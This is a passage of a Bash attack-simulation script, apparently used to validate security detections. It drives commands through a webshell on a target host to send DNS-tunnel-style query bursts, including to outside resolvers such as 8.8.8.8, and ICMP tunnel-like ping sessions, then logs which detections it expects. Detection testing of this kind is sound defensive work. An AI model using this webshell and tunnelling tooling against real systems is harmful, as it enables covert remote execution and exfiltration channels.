    log_message "OK" "DNS Tunnel Simulation: resolver=${resolver_source} server=${dns_server} tool=${DNS_TUNNEL_QUERY_TOOL} domain=${DNS_TUNNEL_DOMAIN_SUFFIX} window=${DETECTION_WINDOW_DNS_WINDOW_SECONDS}s planned=${planned_count}"
    t0=$(date +%s)
    reset_dns_query_verification_stats
    capture_dns_server_query_baseline "${dns_server}" || true
    dns_cmd=$(build_dns_tunnel_simulation_remote_cmd "${planned_count}" "${dns_server}" "${DNS_TUNNEL_DOMAIN_SUFFIX}" "${mode}" "${DNS_TUNNEL_SLEEP_MS}" "${DNS_TUNNEL_JITTER_MS}" "${DNS_TUNNEL_QUERY_TOOL}" "${CAMPAIGN_ID}")
    if ! precheck_dns_remote_payload_syntax "${dns_cmd}" "DNS_TUNNEL_SIM_SCRIPT"; then
        DNS_TUNNEL_SKIP_REASON="DNS_PAYLOAD_SYNTAX_ERROR"
        dns_tunnel_log_both "simulation_skipped reason=${DNS_TUNNEL_SKIP_REASON} resolver=${resolver_source} server=${dns_server}"
        return 1
    fi
    payload_bytes=${#dns_cmd}
    saved_ws_method="${WEBSHELL_METHOD}"
    DNS_TUNNEL_LAST_PAYLOAD_BYTES="${payload_bytes}"
    DNS_TUNNEL_LAST_WEBSHELL_METHOD="${WEBSHELL_METHOD:-GET}"
    dns_tunnel_log_both "DNS_PAYLOAD_TRANSPORT context=simulation_once payload_bytes=${payload_bytes} webshell_method=${WEBSHELL_METHOD:-GET} limit=${PAYLOAD_WARN_BYTES} planned=${planned_count}"
    if (( payload_bytes > PAYLOAD_WARN_BYTES )) && [[ "${WEBSHELL_METHOD}" == "GET" ]]; then
        WEBSHELL_METHOD=POST
        dns_tunnel_log_both "webshell switched GET->POST for DNS payload (${payload_bytes} bytes)"
    fi
    out=$(run_webshell_long "dns-tunnel-simulation-${resolver_source}" "${dns_cmd}" 2>/dev/null || true)
    WEBSHELL_METHOD="${saved_ws_method}"
    DNS_TUNNEL_LAST_REMOTE_OUT="${out}"
    DNS_TUNNEL_LAST_REMOTE_PAYLOAD="${dns_cmd}"
    t1=$(date +%s)
    elapsed=$((t1 - t0))
    parse_dns_tunnel_query_exec_lines "${out}"
    aggregate_dns_query_telemetry_from_output "${out}" || true
    ingest_detection_window_progress_from_output "${out}" "DNS_Tunnel" "${dns_server}" "dns_queries>=${planned_count}"
    if [[ -z "${out}" || "${out}" != *"DNS_TUNNEL_SIM_STATS"* ]]; then
        DNS_TUNNEL_SKIP_REASON=$(poc_diagnose_dns_tunnel_failure "${out}" "${dns_cmd}")
        if (( $(safe_int "${DNS_QUERIES_PLANNED:-${planned_count}}") > 0 )); then
            poc_log_root_cause_analysis "DNS" "${dns_cmd}" "${out}"
        fi
        dns_tunnel_log_both "simulation_failed resolver=${resolver_source} server=${dns_server} reason=${DNS_TUNNEL_SKIP_REASON}"
        printf '%s\n' "${out}" | tr -d '\r' | tail -n 10 | while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            dns_tunnel_log_both "remote_tail: ${line}"
        done
        return 1
    fi
    read -r attempted planned unique success fail nx resolved timeout error a txt avg max entropy ex1 ex2 ex3 avg_label max_label <<< "$(parse_dns_tunnel_sim_stats_line "${out}")"
    sanitize_stats_ints attempted planned unique success fail nx resolved timeout error a txt avg max entropy avg_label max_label
    apply_dns_tunnel_sim_stats_to_globals "${attempted}" "${planned}" "${unique}" "${success}" "${fail}" "${nx}" "${resolved}" "${timeout}" "${error}" "${a}" "${txt}" "${avg}" "${max}" "${entropy}" "${avg_label}" "${max_label}"
    aggregate_dns_query_telemetry_from_output "${out}" || true
    if (( attempted == 0 && $(safe_int "${DNS_QUERIES_ATTEMPTED}") == 0 && planned_count > 0 )); then
        poc_log_root_cause_analysis "DNS" "${dns_cmd}" "${out}"
    fi
    DNS_TUNNEL_PAYLOAD_EXAMPLES="- ${ex1}\n- ${ex2}\n- ${ex3}"
    DNS_TARGET_SERVER="${dns_server}"
    DNS_TUNNEL_RESOLVER_SOURCE="${resolver_source}"
    dns_tunnel_log_both "complete resolver=${resolver_source} server=${dns_server} attempted=${attempted} unique=${unique} nx=${nx} resolved=${resolved} timeout=${timeout} error=${error} A=${a} TXT=${txt}"
    if dns_tunnel_window_condition_met "${attempted}" "${planned_count}"; then
        dw_met=yes
        dw_likelihood=high
    else
        dw_met=no
        dw_likelihood=low
    fi
    log_detection_window_summary "DNS_Tunnel" "${dns_server}" "${elapsed}" "${attempted}" \
        "dns_queries>=${planned_count}" "${dw_met}" "${dw_likelihood}" \
        "concentrated_single_resolver_burst elapsed=${elapsed}s"
    (( attempted > 0 && unique > 0 ))
}

execute_dns_tunnel_simulation_chunked() {
    local total_planned="$1" mode="$2" dns_server="$3" campaign="$4"
    local chunk_size="${DNS_ENH_SIM_CHUNK_SIZE:-40}" chunks=0 c=0 remaining=0 chunk_count=0
    local chunk_out="" dns_cmd="" chunk_rc=0
    local chunk_attempted=0 chunk_nx=0 chunk_resolved=0 chunk_timeout=0 chunk_error=0
    local chunk_success=0 chunk_fail=0 chunk_unique=0 chunk_a=0 chunk_txt=0
    local total_attempted=0 total_nx=0 total_resolved=0 total_timeout=0 total_error=0
    local total_success=0 total_fail=0 total_unique=0 total_a=0 total_txt=0
    local chunk_result="failed" enh_chunks_ok=0 enh_chunks_fail=0
    local _planned _unique _success _fail _nx _resolved _timeout _error _a _txt _avg _max _entropy _ex1 _ex2 _ex3
    local payload_bytes saved_ws_method=""

    total_planned=$(safe_int "${total_planned}")
    (( total_planned < 1 )) && return 1
    dns_server=$(poc_extract_ipv4 "${dns_server}")
    [[ -z "${dns_server}" ]] && return 1
    if ! resolve_dns_tunnel_query_tool; then
        DNS_TUNNEL_SKIP_REASON="${DNS_TUNNEL_SKIP_REASON:-dig/nslookup/host/python3 unavailable}"
        return 1
    fi
    (( chunk_size < DNS_ENH_SIM_CHUNK_MIN )) && chunk_size="${DNS_ENH_SIM_CHUNK_MIN}"
    (( chunk_size > DNS_ENH_SIM_CHUNK_MAX )) && chunk_size="${DNS_ENH_SIM_CHUNK_MAX}"
    chunks=$(( (total_planned + chunk_size - 1) / chunk_size ))
    remaining="${total_planned}"
    log_detection_window_plan "DNS_Tunnel" "${dns_server}" "${DETECTION_WINDOW_DNS_WINDOW_SECONDS}" \
        "dns_queries>=${total_planned}" "${total_planned}" \
        "chunked_enhanced_burst chunks=${chunks} chunk_size=${chunk_size}"
    log_dns_tunnel_selected_resolver "${dns_server}" "${DNS_TUNNEL_RESOLVER_SOURCE:-target_dns}" "enhanced_chunked_simulation"
    dns_tunnel_log_both "enhanced_chunked_start planned=${total_planned} chunks=${chunks} chunk_size=${chunk_size} server=${dns_server} mode=${mode}"
    reset_dns_query_verification_stats
    capture_dns_server_query_baseline "${dns_server}" || true
    saved_ws_method="${WEBSHELL_METHOD}"

    for ((c = 1; c <= chunks; c++)); do
        pipeline_stop_requested && break
        [[ "${remaining}" -lt 1 ]] && break
        chunk_count="${remaining}"
        (( chunk_count > chunk_size )) && chunk_count="${chunk_size}"
        chunk_attempted=0
        chunk_nx=0
        chunk_resolved=0
        chunk_timeout=0
        chunk_error=0
        chunk_success=0
        chunk_fail=0
        chunk_unique=0
        chunk_a=0
        chunk_txt=0
        chunk_result="failed"
        dns_cmd=$(build_dns_tunnel_simulation_remote_cmd "${chunk_count}" "${dns_server}" "${DNS_TUNNEL_DOMAIN_SUFFIX}" "${mode}" "${DNS_TUNNEL_SLEEP_MS}" "${DNS_TUNNEL_JITTER_MS}" "${DNS_TUNNEL_QUERY_TOOL}" "${campaign}" yes)
        if ! precheck_dns_remote_payload_syntax "${dns_cmd}" "DNS_TUNNEL_SIM_SCRIPT"; then
            DNS_TUNNEL_ENH_REASON="DNS_PAYLOAD_SYNTAX_ERROR"
            log_webshell_chunk_debug "DNS_TUNNEL_ENHANCED_CHUNK_DEBUG" "${c}/${chunks}" "" "DNS_PAYLOAD_SYNTAX_ERROR"
            dns_tunnel_log_both "DNS_TUNNEL_ENHANCED_CHUNK_RESULT chunk=${c}/${chunks} attempted=0 success=0 nx=0 result=failed reason=DNS_PAYLOAD_SYNTAX_ERROR"
            enh_chunks_fail=$((enh_chunks_fail + 1))
            remaining=$((remaining - chunk_count))
            continue
        fi
        payload_bytes=${#dns_cmd}
        DNS_TUNNEL_LAST_PAYLOAD_BYTES="${payload_bytes}"
        DNS_TUNNEL_LAST_WEBSHELL_METHOD="${WEBSHELL_METHOD:-GET}"
        dns_tunnel_log_both "DNS_PAYLOAD_TRANSPORT context=enhanced_sim_chunk chunk=${c}/${chunks} payload_bytes=${payload_bytes} webshell_method=${WEBSHELL_METHOD:-GET} limit=${PAYLOAD_WARN_BYTES} planned=${chunk_count}"
        if (( payload_bytes > PAYLOAD_WARN_BYTES )) && [[ "${WEBSHELL_METHOD}" == "GET" ]]; then
            WEBSHELL_METHOD=POST
            dns_tunnel_log_both "webshell switched GET->POST for DNS enhanced sim chunk ${c} (${payload_bytes} bytes)"
        fi
        chunk_out=$(run_webshell_quick "dns-enhanced-sim-chunk-${c}" "${dns_cmd}" 2>/dev/null || true)
        parse_dns_tunnel_query_exec_lines "${chunk_out}"
        aggregate_dns_query_telemetry_from_output "${chunk_out}" || true
        if [[ "${chunk_out}" == *"DNS_TUNNEL_SIM_STATS"* ]]; then
            read -r chunk_attempted _planned chunk_unique chunk_success chunk_fail chunk_nx chunk_resolved chunk_timeout chunk_error chunk_a chunk_txt _avg _max _entropy _ex1 _ex2 _ex3 _avg_label _max_label <<< "$(parse_dns_tunnel_sim_stats_line "${chunk_out}")"
            sanitize_stats_ints chunk_attempted _planned chunk_unique chunk_success chunk_fail chunk_nx chunk_resolved chunk_timeout chunk_error chunk_a chunk_txt _avg _max _entropy
            if (( chunk_attempted > 0 )); then
                chunk_result="success"
                enh_chunks_ok=$((enh_chunks_ok + 1))
            else
                chunk_result="failed"
                enh_chunks_fail=$((enh_chunks_fail + 1))
                [[ -z "${DNS_TUNNEL_ENH_REASON}" || "${DNS_TUNNEL_ENH_REASON}" == ok ]] && DNS_TUNNEL_ENH_REASON="chunk_zero_attempted"
                log_webshell_chunk_debug "DNS_TUNNEL_ENHANCED_CHUNK_DEBUG" "${c}/${chunks}" "${chunk_out}" "chunk_zero_attempted"
            fi
        else
            enh_chunks_fail=$((enh_chunks_fail + 1))
            DNS_TUNNEL_SKIP_REASON=$(poc_diagnose_dns_tunnel_failure "${chunk_out}")
            [[ -z "${DNS_TUNNEL_ENH_REASON}" ]] && DNS_TUNNEL_ENH_REASON="${DNS_TUNNEL_SKIP_REASON:-chunk_no_stats}"
            log_webshell_chunk_debug "DNS_TUNNEL_ENHANCED_CHUNK_DEBUG" "${c}/${chunks}" "${chunk_out}" "${DNS_TUNNEL_ENH_REASON}"
            dns_tunnel_log_both "DNS_TUNNEL_ENHANCED_CHUNK_RESULT chunk=${c}/${chunks} attempted=0 success=0 nx=0 result=failed reason=${DNS_TUNNEL_ENH_REASON}"
            remaining=$((remaining - chunk_count))
            continue
        fi
        total_attempted=$((total_attempted + chunk_attempted))
        total_nx=$((total_nx + chunk_nx))
        total_resolved=$((total_resolved + chunk_resolved))
        total_timeout=$((total_timeout + chunk_timeout))
        total_error=$((total_error + chunk_error))
        total_success=$((total_success + chunk_success))
        total_fail=$((total_fail + chunk_fail))
        total_unique=$((total_unique + chunk_unique))
        total_a=$((total_a + chunk_a))
        total_txt=$((total_txt + chunk_txt))
        dns_tunnel_log_both "DNS_TUNNEL_ENHANCED_CHUNK_RESULT chunk=${c}/${chunks} attempted=${chunk_attempted} success=${chunk_success} nx=${chunk_nx} resolved=${chunk_resolved} timeout=${chunk_timeout} result=${chunk_result}"
        state_append "dns_tunnel_waves.log" "cycle=${CURRENT_CYCLE:-1} enhanced_chunk=${c} attempted=${chunk_attempted} server=${dns_server} result=${chunk_result}"
        remaining=$((remaining - chunk_count))
    done
    WEBSHELL_METHOD="${saved_ws_method}"

    DNS_QUERIES_ATTEMPTED="${total_attempted}"
    DNS_TUNNEL_UNIQUE_QUERIES="${total_unique}"
    DNS_TUNNEL_SUCCESS_COUNT="${total_success}"
    DNS_TUNNEL_FAILURE_COUNT="${total_fail}"
    DNS_TUNNEL_NXDOMAIN_COUNT="${total_nx}"
    DNS_TUNNEL_RESOLVED_COUNT="${total_resolved}"
    DNS_TUNNEL_TIMEOUT_COUNT="${total_timeout}"
    DNS_TUNNEL_ERROR_COUNT="${total_error}"
    DNS_A_QUERIES="${total_a}"
    DNS_TXT_QUERIES="${total_txt}"
    DNS_TARGET_SERVER="${dns_server}"
    DNS_TUNNEL_ENH_ATTEMPTED="${total_attempted}"
    DNS_TUNNEL_ENH_SUCCESS="${total_success}"
    DNS_TUNNEL_ENH_FAIL="${total_fail}"
    DNS_TUNNEL_ENH_NX="${total_nx}"
    DNS_TUNNEL_ENH_TIMEOUT="${total_timeout}"
    if (( total_attempted > 0 && total_unique > 0 )); then
        DNS_TUNNEL_ENH_RESULT="success"
        DNS_TUNNEL_ENH_REASON="ok chunks_ok=${enh_chunks_ok} chunks_fail=${enh_chunks_fail}"
    else
        DNS_TUNNEL_ENH_RESULT="failed"
        DNS_TUNNEL_ENH_REASON="${DNS_TUNNEL_ENH_REASON:-all_chunks_failed}"
        (( total_attempted > 0 && total_unique == 0 )) && DNS_TUNNEL_ENH_REASON="unique_queries=0 attempted=${total_attempted}"
        dns_tunnel_log_both "DNS_TUNNEL_ENHANCED_FAILURE reason=${DNS_TUNNEL_ENH_REASON} chunks=${chunks} server=${dns_server} detail=enhanced_attempted=${total_attempted} unique=${total_unique} fallback_required=yes"
    fi
    dns_tunnel_log_both "enhanced_chunked_complete attempted=${total_attempted} unique=${total_unique} nx=${total_nx} resolved=${total_resolved} chunks_ok=${enh_chunks_ok} chunks_fail=${enh_chunks_fail}"
    (( total_attempted > 0 && total_unique > 0 ))
}

run_dns_tunnel_simulation() {
    local planned_count="${1:-${DNS_BURST_COUNT}}" mode="${2:-${DNS_TUNNEL_MODE}}" dns_server="" tool="" out=""
    local attempted=0 cl infra txt total planned_mode="${mode}" sim_result="failed"
    local primary_server="" primary_source="" fallback_server="" fallback_source="" fallback_reason=""
    DNS_TUNNEL_SKIP_REASON=""
    reset_dns_tunnel_execution_stats
    planned_count=$(safe_int "${planned_count}")
    planned_count=$(resolve_dns_detection_window_plan "${planned_count}")
    DNS_QUERIES_PLANNED="${planned_count}"
    read -r cl infra txt total DNS_TUNNEL_MODE_USED <<< "$(dns_tunnel_resolve_mode_plan "${mode}" "${planned_count}")"

    dns_tunnel_log_both "simulation_start mode=${mode} planned=${planned_count} infra=${infra} txt=${txt}"
    log_message "OK" "DNS Tunnel Simulation: mode=${DNS_TUNNEL_MODE_USED} planned=${planned_count} (infra=${infra} TXT-burst=${txt})"
    log_message "OK" "DNS Tunnel Simulation: query type distribution planned A~$((infra * 2 / 3)) TXT~$((infra / 3 + txt))"

    if [[ "${DRY_RUN}" == true ]]; then
        DNS_TUNNEL_PAYLOAD_EXAMPLES="- $(generate_infrastructure_queries 1 "${DNS_TUNNEL_DOMAIN_SUFFIX}" | awk '{print $1}')\n- $(generate_txt_burst_queries 1 "${DNS_TUNNEL_DOMAIN_SUFFIX}" | awk '{print $1}')"
        select_dns_tunnel_target >/dev/null
        log_detection_window_plan "DNS_Tunnel" "${DNS_TARGET_SERVER:-system}" "${DETECTION_WINDOW_DNS_WINDOW_SECONDS}" \
            "dns_queries>=${planned_count}" "${planned_count}" \
            "single_resolver_concentrated_burst_stellar_${DETECTION_WINDOW_BUCKET_SECONDS}s_bucket"
        log_detection_window_summary "DNS_Tunnel" "${DNS_TARGET_SERVER:-system}" "${DETECTION_WINDOW_DNS_WINDOW_SECONDS}" \
            "${planned_count}" "dns_queries>=${planned_count}" yes high "dry-run_planned"
        DNS_TUNNEL_SKIP_REASON=""
        dns_apply_dry_run_enhanced_synthetic "${planned_count}" "${infra}" "${txt}" || {
            sim_result="failed"
            log_dns_tunnel_final_summary "${sim_result}"
            return 1
        }
        sim_result="${DNS_TUNNEL_FINAL_RESULT:-success}"
        log_dns_tunnel_final_summary "${sim_result}"
        dns_tunnel_log_both "dry_run planned=${planned_count} enhanced=${DNS_TUNNEL_ENH_ATTEMPTED} fallback=${DNS_TUNNEL_FB_ATTEMPTED} attempted=${DNS_QUERIES_ATTEMPTED} server=${DNS_TARGET_SERVER} mode=${DNS_TUNNEL_MODE_USED} tool=planned-local"
        log_message "OK" "Expected Stellar detection: DNS Tunneling Anomaly (dry-run synthetic plan)"
        return 0
    fi

    if ! primary_server=$(select_dns_tunnel_target); then
        primary_server=""
    fi
    primary_server=$(poc_extract_ipv4 "${primary_server}")
    primary_source="${DNS_TUNNEL_RESOLVER_SOURCE:-target_dns}"

    if [[ -n "${primary_server}" ]] && run_dns_tunnel_simulation_once "${planned_count}" "${mode}" "${primary_server}" "${primary_source}" "${DNS_TARGET_SELECTION_DETAIL:-target_dns_selected}"; then
        sim_result="success"
        log_dns_tunnel_final_summary "${sim_result}"
        log_message "OK" "DNS Tunnel Simulation complete: attempted=${DNS_QUERIES_ATTEMPTED} unique=${DNS_TUNNEL_UNIQUE_QUERIES} nx=${DNS_TUNNEL_NXDOMAIN_COUNT} resolved=${DNS_TUNNEL_RESOLVED_COUNT} server=${DNS_TARGET_SERVER}"
        log_message "OK" "Expected Stellar detection: DNS Tunneling Anomaly (dns_tunnel / T1048)"
        return 0
    fi

    if [[ "${primary_source}" == target_dns ]]; then
        dns_tunnel_log_both "primary target_dns tunnel queries failed or zero sent — attempting fallback resolver"
        fallback_server=$(discover_dns_resolver_from_webshell)
        fallback_server=$(poc_extract_ipv4 "${fallback_server}")
        dns_resolver_is_stub "${fallback_server}" && fallback_server=""
        if [[ -n "${fallback_server}" && "${fallback_server}" != "${primary_server}" ]]; then
            validate_dns_server_remote "${fallback_server}" "resolver" >/dev/null 2>&1 || true
            fallback_source="system_resolver"
            fallback_reason="target_dns_tunnel_failed"
            DNS_TUNNEL_FALLBACK_RESOLVER=true
            if run_dns_tunnel_simulation_once "${planned_count}" "${mode}" "${fallback_server}" "${fallback_source}" "${fallback_reason}"; then
                sim_result="partial"
                log_dns_tunnel_final_summary "${sim_result}"
                dns_tunnel_log_both "fallback_resolver success source=${fallback_source} server=${fallback_server}"
                return 0
            fi
        fi
        for fallback_server in ${DNS_TUNNEL_USER_SERVER} 8.8.8.8; do
            [[ -z "${fallback_server}" ]] && continue
            fallback_server=$(poc_extract_ipv4 "${fallback_server}")
            [[ -z "${fallback_server}" || "${fallback_server}" == "${primary_server}" ]] && continue
            dns_resolver_is_stub "${fallback_server}" && continue
            validate_dns_server_remote "${fallback_server}" "fallback" >/dev/null 2>&1 || true
            fallback_source="fallback"
            fallback_reason="target_dns_and_system_resolver_failed"
            DNS_TUNNEL_FALLBACK_RESOLVER=true
            dns_tunnel_log_both "fallback_resolver attempt source=${fallback_source} server=${fallback_server} reason=${fallback_reason}"
            if run_dns_tunnel_simulation_once "${planned_count}" "${mode}" "${fallback_server}" "${fallback_source}" "${fallback_reason}"; then
                sim_result="partial"
                log_dns_tunnel_final_summary "${sim_result}"
                return 0
            fi
        done
    fi

    DNS_TUNNEL_SKIP_REASON="${DNS_TUNNEL_SKIP_REASON:-simulation returned zero sent queries}"
    sim_result="failed"
    log_dns_tunnel_final_summary "${sim_result}"
    dns_tunnel_log_both "skip reason=${DNS_TUNNEL_SKIP_REASON}"
    return 1
}


append_icmp_tunnel_wave_log() {
    local msg="$1"
    mkdir -p "${LOG_DIR}"
    printf '%s\n' "[$(date '+%Y-%m-%d %H:%M:%S')] cycle=${CURRENT_CYCLE:-1} ${msg}" >> "${LOG_DIR}/icmp_tunnel_waves.log"
}

icmp_tunnel_log_both() {
    local msg="$1"
    append_icmp_tunnel_wave_log "${msg}"
    state_append "icmp_tunnel_simulation.log" "cycle=${CURRENT_CYCLE:-1} ${msg}"
    log_message "OK" "ICMP Tunnel: ${msg}" >&2
}

append_icmp_tunnel_remote_tail() {
    local out="$1" reason="$2"
    append_icmp_tunnel_wave_log "reason=${reason}"
    printf '%s\n' "${out}" | tr -d '\r' | tail -n 20 | while IFS= read -r line; do
        [[ -z "${line}" ]] && continue
        append_icmp_tunnel_wave_log "remote: ${line}"
    done
}

icmp_tunnel_clamp_packet_count() {
    local n="$1"
    n=$(safe_int "${n}")
    (( n < 50 )) && n=50
    (( n > ICMP_TUNNEL_MAX_PACKET_COUNT )) && n="${ICMP_TUNNEL_MAX_PACKET_COUNT}"
    printf '%s' "${n}"
}

icmp_tunnel_clamp_payload_size() {
    local n="$1"
    n=$(safe_int "${n}")
    (( n < 64 )) && n=64
    (( n > ICMP_TUNNEL_MAX_PAYLOAD_SIZE )) && n="${ICMP_TUNNEL_MAX_PAYLOAD_SIZE}"
    printf '%s' "${n}"
}

icmp_tunnel_resolve_mode() {
    local mode="${1:-${ICMP_TUNNEL_MODE:-auto}}"
    case "${mode}" in
        tunnel-like-session)
            printf '%s' "tunnel-like-session"
            ;;
        payload-size-anomaly|alert-profiles)
            printf '%s' "payload-size-anomaly"
            ;;
        large-payload-burst|sustained-large-icmp|mtu-like-anomaly|mixed-size-icmp)
            printf '%s' "${mode}"
            ;;
        auto|*)
            printf '%s' "tunnel-like-session"
            ;;
    esac
}

icmp_tunnel_random_payload_size() {
    printf '%s' "$((1300 + RANDOM % 151))"
}

icmp_tunnel_random_interval_sec() {
    awk -v r="${RANDOM}" 'BEGIN{printf "%.1f", 0.3 + (r % 8) * 0.1}'
}

icmp_tunnel_pick_packet_count() {
    resolve_icmp_detection_window_plan "${ICMP_PACKET_COUNT}"
}

collect_icmp_candidate_hosts() {
    collect_icmp_tunnel_discovery_ips
}

icmp_sanitize_log_value() {
    printf '%s' "${1:-}" | tr '\r\n' ' ' | sed 's/  */ /g' | head -c 3500
}

build_icmp_probe_ping_command() {
    local host="$1"
    local ping_bin="${REMOTE_PING_PATH:-ping}"
    local style="${ICMP_PING_STYLE:-unix}"
    local flavor="${PING_FLAVOR:-unknown}"
    local timeout_opt="${PING_TIMEOUT_OPT:--W}"
    [[ -z "${ping_bin}" ]] && ping_bin="ping"
    if [[ "${style}" == windows ]]; then
        printf '%s -n 2 -w 1000 %s' "${ping_bin}" "${host}"
        return 0
    fi
    if [[ "${flavor}" == busybox || "${timeout_opt}" == "-w" ]]; then
        printf '%s -c 2 -w 1 %s' "${ping_bin}" "${host}"
        return 0
    fi
    printf '%s -c 2 -W 1 %s' "${ping_bin}" "${host}"
}

parse_icmp_ping_transmit_receive() {
    local out="$1"
    local sent=0 received=0 line
    out=$(printf '%s' "${out}" | tr -d '\r')
    if [[ "${ICMP_PING_STYLE:-unix}" == windows ]]; then
        sent=$(printf '%s' "${out}" | sed -n 's/.*Sent = \([0-9][0-9]*\).*/\1/p' | tail -n1)
        received=$(printf '%s' "${out}" | sed -n 's/.*Received = \([0-9][0-9]*\).*/\1/p' | tail -n1)
        if [[ -z "${received}" ]]; then
            received=$(printf '%s' "${out}" | grep -ciE 'Reply from|bytes=' || true)
            [[ -z "${sent}" && "${received}" -gt 0 ]] && sent=2
        fi
        printf '%s %s' "$(safe_int "${sent}")" "$(safe_int "${received}")"
        return 0
    fi
    while IFS= read -r line; do
        if [[ "${line}" =~ ([0-9]+)[[:space:]]+packets[[:space:]]+transmitted,[[:space:]]+([0-9]+)[[:space:]]+received ]]; then
            sent="${BASH_REMATCH[1]}"
            received="${BASH_REMATCH[2]}"
            break
        fi
        if [[ "${line}" =~ ([0-9]+)[[:space:]]+packets[[:space:]]+transmitted,[[:space:]]+([0-9]+)[[:space:]]+packets[[:space:]]+received ]]; then
            sent="${BASH_REMATCH[1]}"
            received="${BASH_REMATCH[2]}"
            break
        fi
    done <<< "${out}"
    if (( sent == 0 && received == 0 )); then
        if printf '%s' "${out}" | grep -qiE 'packets[[:space:]]+transmitted'; then
            sent=$(printf '%s' "${out}" | sed -n 's/.*\([0-9][0-9]*\) packets transmitted.*/\1/p' | tail -n1)
            received=$(printf '%s' "${out}" | sed -n 's/.*\([0-9][0-9]*\) packets received.*/\1/p' | tail -n1)
            [[ -z "${received}" ]] && received=$(printf '%s' "${out}" | sed -n 's/.*\([0-9][0-9]*\) received.*/\1/p' | tail -n1)
        fi
    fi
    if (( received == 0 )); then
        received=$(printf '%s' "${out}" | grep -ciE 'bytes from|^[0-9]+ bytes from' || true)
        if (( received > 0 )); then
            (( sent == 0 )) && sent=2
        fi
    fi
    printf '%s %s' "$(safe_int "${sent}")" "$(safe_int "${received}")"
}

classify_icmp_probe_failure() {
    local sent="$1" received="$2" out="$3" ws_empty="$4"
    local low
    low=$(printf '%s' "${out}" | tr '[:upper:]' '[:lower:]')
    if [[ "${low}" == *"permission denied"* || "${low}" == *"operation not permitted"* ]]; then
        printf 'permission_denied'
        return 0
    fi
    if [[ "${low}" == *"command not found"* ]]; then
        printf 'command_failed'
        return 0
    fi
    if (( sent > 0 && received > 0 )); then
        printf 'alive'
        return 0
    fi
    if (( sent > 0 && received == 0 )); then
        printf 'target_unresponsive'
        return 0
    fi
    if (( sent == 0 )); then
        if [[ "${ws_empty}" == true ]]; then
            printf 'command_failed'
            return 0
        fi
        if [[ "${low}" == *"timed out"* || "${low}" == *"timeout"* ]]; then
            printf 'timeout'
            return 0
        fi
        if printf '%s' "${low}" | grep -qiE 'transmitted|received|bytes from|reply from|packets received'; then
            if printf '%s' "${low}" | grep -qiE 'unknown host|name or service not known|cannot resolve'; then
                printf 'target_unresponsive'
            else
                printf 'parser_failed'
            fi
            return 0
        fi
        if [[ "${low}" == *"invalid"* || "${low}" == *"unsupported"* || "${low}" == *"unrecognized"* ]]; then
            printf 'unsupported_ping_output'
            return 0
        fi
        printf 'command_failed'
        return 0
    fi
    printf 'target_unresponsive'
}

log_icmp_probe_diagnostics() {
    local host="$1" cmd="$2" out="$3"
    local safe_out
    safe_out=$(icmp_sanitize_log_value "${out}")
    ICMP_PROBE_COMMAND="${cmd}"
    ICMP_PROBE_RAW_OUTPUT="${out}"
    icmp_tunnel_log_both "ICMP_TUNNEL_PROBE_COMMAND target=${host} cmd=${cmd}"
    icmp_tunnel_log_both "ICMP_TUNNEL_PROBE_RAW_OUTPUT target=${host} output=${safe_out}"
    state_append "icmp_tunnel_probe.log" "ICMP_TUNNEL_PROBE_COMMAND target=${host} cmd=${cmd}"
    printf '%s\n' "${out}" | tr -d '\r' | while IFS= read -r line; do
        [[ -z "${line}" ]] && continue
        state_append "icmp_tunnel_probe.log" "ICMP_TUNNEL_PROBE_RAW_OUTPUT target=${host} line=${line}"
    done
}

icmp_is_internal_target_name() {
    case "${1,,}" in
        alive_map|alive_targets|target_candidates|alive_prio|alive_src|"") return 0 ;;
    esac
    [[ "${1}" == *_map || "${1}" == *_targets ]] && return 0
    return 1
}

icmp_format_log_target() {
    local t="${1:-}"
    t=$(poc_extract_ipv4 "${t}")
    if icmp_is_valid_ipv4_target "${t}"; then
        printf '%s' "${t}"
        return 0
    fi
    t=$(poc_extract_ipv4 "${ICMP_IMMUTABLE_TARGET:-}")
    if icmp_is_valid_ipv4_target "${t}"; then
        printf '%s' "${t}"
        return 0
    fi
    printf 'n/a'
}

icmp_lock_selected_target() {
    local ip="$1"
    ip=$(poc_extract_ipv4 "${ip}")
    icmp_is_valid_ipv4_target "${ip}" || return 1
    ICMP_IMMUTABLE_TARGET="${ip}"
    ICMP_SELECTED_TARGET="${ip}"
    return 0
}

icmp_likelihood_rank() {
    case "${1^^}" in
        HIGH) printf '3' ;;
        MEDIUM) printf '2' ;;
        LOW) printf '1' ;;
        *) printf '0' ;;
    esac
}

icmp_is_anomaly_only_mode() {
    case "${1:-${ICMP_MODE_USED:-}}" in
        payload-size-anomaly|alert-profiles|large-payload-burst|sustained-large-icmp|mtu-like-anomaly|mixed-size-icmp)
            return 0 ;;
    esac
    return 1
}

icmp_compute_tunnel_like_score() {
    local sent="$1" received="$2" duration="$3" payload_min="$4" payload_max="$5" interval_ms="$6"
    local score=0 ratio=0
    sent=$(safe_int "${sent}")
    received=$(safe_int "${received}")
    duration=$(safe_int "${duration}")
    payload_min=$(safe_int "${payload_min}")
    payload_max=$(safe_int "${payload_max}")
    interval_ms=$(safe_int "${interval_ms}")
    ICMP_TUNNEL_LIKE_SCORE=0
    ICMP_BIDIRECTIONAL_RATIO=0
    ICMP_SESSION_DURATION="${duration}"
    ICMP_INTERVAL_MS="${interval_ms}"
    if icmp_is_anomaly_only_mode "${ICMP_MODE_USED:-}"; then
        return 0
    fi
    (( duration >= 60 )) && score=$((score + 20))
    (( duration >= 120 )) && score=$((score + 10))
    if (( payload_min > 0 && payload_max > 0 )); then
        if (( payload_min == payload_max )); then
            score=$((score + 20))
        elif (( payload_max > 0 && payload_min * 100 / payload_max >= 95 )); then
            score=$((score + 15))
        fi
    fi
    if (( sent > 0 )); then
        ratio=$((received * 100 / sent))
        ICMP_BIDIRECTIONAL_RATIO="${ratio}"
        (( ratio >= 70 )) && score=$((score + 25))
        (( ratio >= 50 && ratio < 70 )) && score=$((score + 12))
    fi
    (( sent >= 40 )) && score=$((score + 10))
    (( sent >= 80 )) && score=$((score + 10))
    (( interval_ms >= 800 && interval_ms <= 1500 )) && score=$((score + 5))
    if (( sent < 80 )); then
        local cap=0
        cap=$((sent * 70 / 80))
        (( cap > 55 )) && cap=55
        (( score > cap )) && score="${cap}"
    fi
    (( score > 100 )) && score=100
    ICMP_TUNNEL_LIKE_SCORE="${score}"
}

_icmp_eval_detection_likelihood() {
    local sent="$1" avg_payload="$2" duration="$3"
    local large="${4:-${ICMP_LARGE_PACKETS:-0}}" ratio="${5:-${ICMP_LARGE_PAYLOAD_RATIO:-0}}" pmax="${6:-${ICMP_PAYLOAD_SIZE_MAX:-0}}"
